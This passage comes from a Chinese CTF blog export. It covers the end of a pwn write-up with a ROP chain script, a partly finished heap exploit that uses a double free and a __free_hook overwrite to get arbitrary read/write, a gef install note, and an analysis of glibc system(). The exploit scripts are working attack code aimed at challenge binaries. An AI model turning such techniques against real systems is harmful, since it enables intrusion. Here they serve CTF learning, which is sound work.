+ 0x8]</span></span><br><span class="line">        <span class="keyword">return</span> pl</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pl     = p64(<span class="number">0</span>)       <span class="comment"># for junk</span></span><br><span class="line">        pl += p64(<span class="number">0x0</span>)     <span class="comment"># rbx be 0x0</span></span><br><span class="line">        pl += p64(<span class="number">0x1</span>)     <span class="comment"># rbp be 0x1</span></span><br><span class="line">        pl += p64(jmp2)    <span class="comment"># r12 jump to</span></span><br><span class="line">        pl += p64(arg3)    <span class="comment"># r13 -&gt; rdx    arg3</span></span><br><span class="line">        pl += p64(arg2)    <span class="comment"># r14 -&gt; rsi    arg2</span></span><br><span class="line">        pl += p64(arg1)    <span class="comment"># r15 -&gt; edi    arg1</span></span><br><span class="line">        pl += p64(part2)   <span class="comment"># part2 entry will call [rbx + r12 + 0x8]</span></span><br><span class="line">        <span class="keyword">return</span> pl</span><br><span class="line"></span><br><span class="line">payload =  com_gadget(gadget_1,gadget_2,addr_got_read,arg1=<span class="number">0x0</span>,arg2=addr_got_alarm,arg3=<span class="number">1</span>)</span><br><span class="line">payload += com_gadget(gadget_1,gadget_2,addr_got_read,arg1=<span class="number">0x0</span>,arg2=addr_bss,arg3=<span class="number">0x3B</span>,Flag=<span class="literal">False</span>)</span><br><span class="line">payload += com_gadget(gadget_1,gadget_2,addr_bss+<span class="number">8</span>,arg1=addr_bss,arg2=<span class="number">0x0</span>,arg3=<span class="number">0x0</span>,Flag=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload), <span class="number">0</span>, -<span class="number">8</span>):</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        write_stack(payload[i-<span class="number">8</span>:i])</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    raw_input(<span class="string">&#x27;0x00000000004006F5 &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(token))</span><br><span class="line">    p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x00000000004006CB</span>))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    off = <span class="number">5</span></span><br><span class="line">    p.send(<span class="built_in">str</span>(off))  <span class="comment"># ovwer write one byte</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">    payload2 += p64(<span class="number">0x0000000000400540</span>)</span><br><span class="line">    payload2 += (<span class="number">0x3B</span> - <span class="built_in">len</span>(payload2) - <span class="number">1</span>) * <span class="string">&quot;A&quot;</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="fast-fast-fast-未完成"><a href="#fast-fast-fast-未完成" class="headerlink" title="fast-fast-fast [未完成]"></a>fast-fast-fast [未完成]</h4><h6 id="1-vuln-1"><a href="#1-vuln-1" class="headerlink" title="1.vuln"></a>1.vuln</h6><p>fastbin的利用，目标就是控制fd指针，然后分配到自己想要的地址，正好全局指针都在<code>.bss</code>。<br>程序的漏洞是<code>double free</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">delet</span><span class="params">(__int64 ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(*(_QWORD *)(ptr + <span class="number">16</span>));</span><br><span class="line">  result = ptr;</span><br><span class="line">  *(_QWORD *)ptr = <span class="number">0L</span>L;                         <span class="comment">// set flag 0</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="2-tips-1"><a href="#2-tips-1" class="headerlink" title="2.tips"></a>2.tips</h6><p>利用过程：</p>
<ol>
<li>   分配一个fastbin，然后释放掉</li>
<li>   分配一个smallbin，然后释放fastbin(其实这里释放的是smallbin)</li>
<li>   再次分配刚才释放掉的块(fastbin的菜单里)</li>
<li>   编辑释放块，这里要伪造chunk</li>
<li>   调用saysercrt()分配fastbin</li>
<li>   分配的想要的块(得到一个.bss上的指针)</li>
<li>   之后利用edit功能，可以完成任意地址读写</li>
</ol>
<p>不过要注意的是，程序静态链接的…所以为了得到一个任意地址读，选择覆盖<br><code>.bss:00000000006C3750 __free_hook     dq ?                    ; DATA XREF: ptmalloc_lock_all+CDr</code><br>为<br><code>.text:00000000004082A0                 sub     rsp, 0D8h       ; Alternative name is &#39;_IO_printf&#39;</code></p>
<p>在开启NX的情况下，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ checksec fast-fast-fast</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;muhe&#x2F;Desktop&#x2F;ctf_work&#x2F;ichunqiu&#x2F;pwn1&#x2F;fast-fast-fast&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只能ROP了，要么ROP起shell(syscall那种)，要么mprotect改写内存属性执行写进去的sc。</p>
<h6 id="3-exploit-1"><a href="#3-exploit-1" class="headerlink" title="3.exploit"></a>3.exploit</h6><p>在完成任意地址读写之后，ROP链还没构造好…难过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">LOCAL  = <span class="literal">True</span></span><br><span class="line">LITTLE = <span class="number">0x1</span> <span class="comment">#fastbin</span></span><br><span class="line">SMALL  = <span class="number">0x2</span> <span class="comment">#smallbin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    target = <span class="string">&#x27;./fast-fast-fast&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    target = (<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">io = zio(target, timeout=<span class="number">10000</span>, print_read=COLORED(RAW, <span class="string">&#x27;red&#x27;</span>), print_write=COLORED(RAW, <span class="string">&#x27;green&#x27;</span>))</span><br><span class="line"></span><br><span class="line">environ = <span class="number">0x00000000006C3888</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params"><span class="built_in">type</span>,content</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span> == LITTLE):</span><br><span class="line">        <span class="comment">#little sercret</span></span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;please input your secret&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="built_in">str</span>(content))</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">type</span> == SMALL):</span><br><span class="line">        <span class="comment">#small sercret</span></span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;please input your secret&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">type</span>,new_content</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span> == LITTLE):</span><br><span class="line">        <span class="comment">#little sercret</span></span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#io.read_until(&#x27;please input your secret&#x27;)</span></span><br><span class="line">        io.writeline(<span class="built_in">str</span>(new_content))</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">type</span> == SMALL):</span><br><span class="line">        <span class="comment">#small sercret</span></span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#io.read_until(&#x27;please input your secret&#x27;)</span></span><br><span class="line">        io.writeline(<span class="built_in">str</span>(new_content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">type</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span> == LITTLE):</span><br><span class="line">        <span class="comment">#little sercret</span></span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">type</span> == SMALL):</span><br><span class="line">        <span class="comment">#small sercret</span></span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">        io.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_sercret</span>():</span></span><br><span class="line">    io.read_until(<span class="string">&#x27;choose option:&#x27;</span>)</span><br><span class="line">    io.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write2where</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">    edit(LITTLE,l64(<span class="number">1</span>)+l64(<span class="number">0x1F0</span>)+l64(addr))</span><br><span class="line">    edit(SMALL,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_from_where</span>(<span class="params">addr</span>):</span></span><br><span class="line">    edit(LITTLE,l64(<span class="number">1</span>)+l64(<span class="number">0xF0F0</span>)+l64(addr))</span><br><span class="line">    delete(SMALL)</span><br><span class="line">    ret = io.read_until(<span class="string">&#x27;choose&#x27;</span>)</span><br><span class="line">    ret = ret[:<span class="built_in">len</span>(ret)-<span class="number">6</span>]</span><br><span class="line">    ret = ret[<span class="built_in">len</span>(ret)-<span class="number">6</span>:]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    io.gdb_hint([<span class="number">0x00000000004012CA</span>,<span class="number">0x0000000000401433</span>,<span class="number">0x0000000000401445</span>])</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#create fastbin and free</span></span><br><span class="line">    create(LITTLE,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(LITTLE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#create SMALLBIN</span></span><br><span class="line">    create(SMALL,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#double free here</span></span><br><span class="line">    delete(LITTLE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#depart freed normal chunk</span></span><br><span class="line">    create(LITTLE,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    delete(LITTLE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#edit freed fastbin</span></span><br><span class="line">    edit(SMALL,l64(<span class="number">0x00000000006C4AA0</span>)) <span class="comment">#.bss ---&gt; fastbin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get it</span></span><br><span class="line">    say_sercret()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get chunk ptr --&gt; 0x6c4ab0</span></span><br><span class="line">    create(LITTLE,l64(<span class="number">0x00000000006C4A80</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#modify free() to printf()</span></span><br><span class="line">    write2where(<span class="number">0x00000000006C3750</span>,l64(<span class="number">0x00000000004082A0</span>))</span><br><span class="line"></span><br><span class="line">    tmp = l64(read_from_where(environ).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;stack :&quot;</span> + <span class="built_in">hex</span>(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#now,we get the stack&#x27;s addr ,and we can read-write everywhere.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h4 id="Werewolf-还没做"><a href="#Werewolf-还没做" class="headerlink" title="Werewolf [还没做]"></a>Werewolf [还没做]</h4>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ctf writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>install gef</title>
    <url>/2016/06/29/install-gef/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>gdb是linux下的调试利器，但无奈界面不太友好，所以需要一些辅助插件。</p>
<a id="more"></a>

<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><p>之前我一直使用的是pead,之前了解到还有个插件gef,因为gef支持多构架，而且heap的分析功能简直是CTF中的神器，所以决定装一波。</p>
<h4 id="0x02-问题"><a href="#0x02-问题" class="headerlink" title="0x02: 问题"></a>0x02: 问题</h4><p>在按照官方文档安装之后，一直提示有些模块无法加载，是因为一些依赖库没安装好<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/gef_instll/error.png"></p>
<h4 id="0x04-解决"><a href="#0x04-解决" class="headerlink" title="0x04:解决"></a>0x04:解决</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># root at kali in ~ [3:35:23]</span><br><span class="line">$ cd unicorn </span><br><span class="line"># root at kali in ~&#x2F;unicorn on git:master o [3:35:25]</span><br><span class="line">$ ls</span><br><span class="line">AUTHORS.TXT  config.mk    include        libunicorn.so.1  Makefile      README.md  uc.d</span><br><span class="line">bindings     COPYING      LEAK_VALGRIND  list.c           make.sh       samples    uc.o</span><br><span class="line">ChangeLog    CREDITS.TXT  libunicorn.a   list.d           pkgconfig.mk  tests      unicorn.pc</span><br><span class="line">config.log   docs         libunicorn.so  list.o           qemu          uc.c</span><br><span class="line"># root at kali in ~&#x2F;unicorn on git:master o [3:35:25]</span><br><span class="line">$ cd bindings </span><br><span class="line"># root at kali in ~&#x2F;unicorn&#x2F;bindings on git:master o [3:35:27]</span><br><span class="line">$ ls</span><br><span class="line">const_generator.py  dotnet  go  haskell  java  Makefile  msvc  python  README  ruby</span><br><span class="line"># root at kali in ~&#x2F;unicorn&#x2F;bindings on git:master o [3:35:28]</span><br><span class="line">$ cd python </span><br><span class="line"># root at kali in ~&#x2F;unicorn&#x2F;bindings&#x2F;python on git:master o [3:35:34]</span><br><span class="line">$ sudo python setup.py install</span><br></pre></td></tr></table></figure>
<p>然后就顺利解决了</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/gef_instll/done.jpg"></p>
<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04:"></a>0x04:</h4><p>安装的时候还是建议python3的版本，如果gdb不支持的话，那就只能重新编译了，多多关注gef项目的<a href="https://github.com/hugsy/gef/issues">讨论区</a></p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>linux 下起shell失败的分析</title>
    <url>/2016/11/10/linux-%E4%B8%8B%E8%B5%B7shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00: 起因"></a>0x00: 起因</h4><p>之前在CTF中遇到过一种情况，执行了<code>system(&quot;/bin/sh&quot;)</code>，新进程也起来了，然而shell并没有起来的情况，很尴尬，于是决定好好分析一下为什么！拖延症的我拖了好久…</p>
<a id="more"></a>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/no-shell.png" alt="尴尬的情况"></p>
<h4 id="0x01-先看源码"><a href="#0x01-先看源码" class="headerlink" title="0x01: 先看源码"></a>0x01: 先看源码</h4><p>我觉得最直观的应该是看linux关于<code>system()</code>调用实现的源码，然后写一个demo，直接起shell的那种，单步调试，对比分析，这样应该最直观了。</p>
<ul>
<li>   首先是源码</li>
</ul>
<p>首先调用<code>system()</code>函数，其实是调用了<code>do_system()</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">line</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> __libc_system (<span class="built_in">line</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __libc_system (<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">line</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">line</span> == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="comment">/* Check that we have a command processor available. It might</span></span><br><span class="line"><span class="comment">           ?not be available after a chroot(), for example. */</span></span><br><span class="line">        <span class="keyword">return</span> do_system (<span class="string">"exit 0"</span>) == <span class="number">0</span>; <span class="comment">/* 当line为NULL时，返回值为0，及执行bash –c exit 0*/</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">        <span class="keyword">return</span> do_system (<span class="built_in">line</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*GCC cleanup exception range can cover the</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      LIBC_CANCEL_ASYNC() and LIBC_CANCEL_RESET():http://sourceware.org/ml/libc-alpha/2011-08/msg00063.html */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> oldtype = LIBC_CANCEL_ASYNC ();</span><br><span class="line">    <span class="keyword">int</span> result = do_system (<span class="built_in">line</span>);</span><br><span class="line">    LIBC_CANCEL_RESET (oldtype);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">weak_alias (__libc_system, system)</span><br><span class="line">    <span class="comment">/* Execute LINE as a shell command, returning its status. */</span></span><br></pre></td></tr></table></figure>
<p>这里是<code>do_system()</code>函数的分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">do_system (<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">line</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> status, save;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC_REENTRANT</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">intr</span>, <span class="title">quit</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">sigset_t</span> omask;</span><br><span class="line">    sa.sa_handler = SIG_IGN;</span><br><span class="line">    sa.sa_flags = <span class="number">0</span>;</span><br><span class="line">    __sigemptyset (&amp;sa.sa_mask);</span><br><span class="line">    DO_LOCK (); <span class="comment">/* mutex lock*/</span></span><br><span class="line">    <span class="keyword">if</span> (ADD_REF () == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__sigaction (SIGINT, &amp;sa, &amp;intr) &lt; <span class="number">0</span>) <span class="comment">/*执行时 SIGINT被忽略*/</span></span><br><span class="line">        &#123;</span><br><span class="line">            SUB_REF ();</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (__sigaction (SIGQUIT, &amp;sa, &amp;quit) &lt; <span class="number">0</span>) <span class="comment">/*执行时 SIGQUIT被忽略*/</span></span><br><span class="line">        &#123;</span><br><span class="line">            save = errno;</span><br><span class="line">            SUB_REF ();</span><br><span class="line">            <span class="keyword">goto</span> out_restore_sigint;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    DO_UNLOCK ();</span><br><span class="line">    <span class="comment">/* We reuse the bitmap in the 'sa' structure. */</span></span><br><span class="line">    __sigaddset (&amp;sa.sa_mask, SIGCHLD);</span><br><span class="line">    save = errno;</span><br><span class="line">    <span class="keyword">if</span> (__sigprocmask (SIG_BLOCK, &amp;sa.sa_mask, &amp;omask) &lt; <span class="number">0</span>) <span class="comment">/*执行时设置SIG_BLOCK标志位，SIGCHLD被阻塞，执行失败，则恢复之前的信号的bitmap*/</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC</span></span><br><span class="line">        <span class="keyword">if</span> (errno == ENOSYS)</span><br><span class="line">            __set_errno (save);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">#endif</span><br><span class="line">        &#123;</span><br><span class="line">            DO_LOCK ();</span><br><span class="line">            <span class="keyword">if</span> (SUB_REF () == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                save = errno;</span><br><span class="line">                (<span class="keyword">void</span>) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line">out_restore_sigint:</span><br><span class="line">                (<span class="keyword">void</span>) __sigaction (SIGINT, &amp;intr, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line">                __set_errno (save);</span><br><span class="line">            &#125;</span><br><span class="line">out:</span><br><span class="line">            DO_UNLOCK ();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CLEANUP_HANDLER</span></span><br><span class="line">    CLEANUP_HANDLER;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*执行成功，调用fork，生成子进程执行command命令*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> FORK</span></span><br><span class="line">    pid = FORK (); <span class="comment">/*调用SYS_CALL生成子进程*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    pid = __fork ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (pid == (<span class="keyword">pid_t</span>) <span class="number">0</span>) <span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Child side. */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *new_argv[<span class="number">4</span>];</span><br><span class="line">        <span class="comment">//参数就是：bash -c 你的命令</span></span><br><span class="line">        new_argv[<span class="number">0</span>] = SHELL_NAME;</span><br><span class="line">        new_argv[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line">        new_argv[<span class="number">2</span>] = <span class="built_in">line</span>;</span><br><span class="line">        new_argv[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">/* Restore the signals. */</span></span><br><span class="line">        (<span class="keyword">void</span>) __sigaction (SIGINT, &amp;intr, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line">        (<span class="keyword">void</span>) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line">        (<span class="keyword">void</span>) __sigprocmask (SIG_SETMASK, &amp;omask, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</span><br><span class="line">        INIT_LOCK ();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exec the shell. */</span></span><br><span class="line">        (<span class="keyword">void</span>) __execve (SHELL_PATH, (<span class="keyword">char</span> *<span class="keyword">const</span> *) new_argv, __environ);</span><br><span class="line">        _exit (<span class="number">127</span>); <span class="comment">/*exec执行失败则返回127*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* The fork failed. */</span></span><br><span class="line">        status = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">/*父进程，waitpid*/</span></span><br><span class="line">        <span class="comment">/* Parent side. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Note the system() is a cancellation point. But since we call</span></span><br><span class="line"><span class="comment">           waitpid() which itself is a cancellation point we do not</span></span><br><span class="line"><span class="comment">           have to do anything here. */</span></span><br><span class="line">        <span class="keyword">if</span> (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, <span class="number">0</span>)) != pid)</span><br><span class="line">            status = <span class="number">-1</span>; <span class="comment">/*waitpid 失败返回1*/</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CLEANUP_HANDLER</span></span><br><span class="line">    CLEANUP_RESET;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    save = errno;</span><br><span class="line">    DO_LOCK ();</span><br><span class="line">    <span class="keyword">if</span> ((SUB_REF () == <span class="number">0</span></span><br><span class="line">                &amp;&amp; (__sigaction (SIGINT, &amp;intr, (struct sigaction *) <span class="literal">NULL</span>)</span><br><span class="line">                    | __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) <span class="literal">NULL</span>)) != <span class="number">0</span>)</span><br><span class="line">            || __sigprocmask (SIG_SETMASK, &amp;omask, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC</span></span><br><span class="line">        <span class="comment">/* glibc cannot be used on systems without waitpid. */</span></span><br><span class="line">        <span class="keyword">if</span> (errno == ENOSYS)</span><br><span class="line">            __set_errno (save);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">#endif</span><br><span class="line">            status = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DO_UNLOCK ();</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关于system函数的返回值：</p>
<ol>
<li>   当参数为空时，调用do_system (“exit 0”),返回值为NULL</li>
<li>   调用result = do_system (line)</li>
</ol>
<h4 id="0x02-问题分析"><a href="#0x02-问题分析" class="headerlink" title="0x02 : 问题分析"></a>0x02 : 问题分析</h4><h6 id="1-先调试自己的一个demo"><a href="#1-先调试自己的一个demo" class="headerlink" title="1. 先调试自己的一个demo"></a>1. 先调试自己的一个demo</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">4<span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"test\n"</span>,<span class="number">5</span>);</span><br><span class="line">4system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">4<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行到这里的时候<br><code>(void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);</code><br>gdb里如下所示<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/gdb-args.png" alt="gdb"></p>
<p>参数是这样的，单步之后，shell就起来了。<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/system-any/shell.png" alt="gdb"></p>
